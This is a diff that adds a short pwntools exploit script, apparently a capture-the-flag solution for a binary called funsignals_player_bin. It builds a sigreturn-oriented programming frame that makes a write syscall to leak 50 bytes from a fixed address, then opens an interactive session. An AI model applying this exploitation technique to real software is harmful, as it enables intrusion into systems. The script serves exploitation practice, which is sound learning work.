@@ -1,0 +1,21 @@
+from pwn import *
+
+p = process("./funsignals_player_bin")
+'''
+p = gdb.debug("./funsignals_player_bin", gdbscript = 
+
+)
+'''
+
+context.arch = "amd64"
+
+frame = SigreturnFrame()
+frame.rip = 0x1000000b
+frame.rax = 0x1
+frame.rdi = 0x1
+frame.rsi = 0x10000023
+frame.rdx = 50
+
+p.send(bytes(frame))
+
+p.interactive()
